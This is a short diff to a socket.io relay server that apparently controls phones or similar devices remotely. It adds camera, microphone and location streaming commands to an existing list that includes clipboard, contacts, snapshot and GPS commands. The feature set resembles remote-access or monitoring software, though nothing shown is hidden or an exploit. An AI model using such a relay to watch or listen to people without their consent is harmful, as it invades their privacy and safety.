@@ -218,9 +218,10 @@ io.on('connection', socket => {
     'cmd:set_brightness', 'cmd:ring', 'cmd:set_quality', 'cmd:set_gps_interval', 
     'cmd:launch_app', 'cmd:toggle_sensors', 'cmd:get_network', 'cmd:take_snapshot',
     'cmd:get_clipboard', 'cmd:set_clipboard', 'cmd:tts_speak',
+    'cmd:stream_camera', 'cmd:stream_mic', 'cmd:stream_location',
     // Custom Data Responses
     'apps_list', 'contacts_list', 'device_info', 'sensor_data', 'network_info',
-    'snapshot_data', 'clipboard_data'
+    'snapshot_data', 'clipboard_data', 'stream_status'
   ];
 
   console.log('Registering relay event handlers');
